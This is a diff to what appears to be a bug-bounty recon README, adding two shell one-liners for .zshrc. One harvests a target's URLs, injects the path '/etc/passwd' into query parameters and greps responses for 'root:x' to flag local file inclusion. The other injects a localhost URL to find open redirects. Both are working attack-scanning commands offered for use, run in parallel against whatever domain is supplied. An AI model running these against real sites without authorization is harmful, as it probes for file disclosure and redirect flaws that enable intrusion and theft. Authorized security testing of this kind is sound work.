@@ -133,6 +133,24 @@ Add it to .zshrc
 python3 ~/aem-directory/aem-hacker/aem_hacker.py -u $1 --host $2
 }`
 
+# One-Liner
+
+### LFI
+
+```
+lfi () {
+gau $1 | gf lfi | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+}
+```
+
+### Open-redirect
+
+```
+open-redirect () {
+local LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
+}
+```
+
 
 # Thanks
 #### We use tools which are developed by the following people
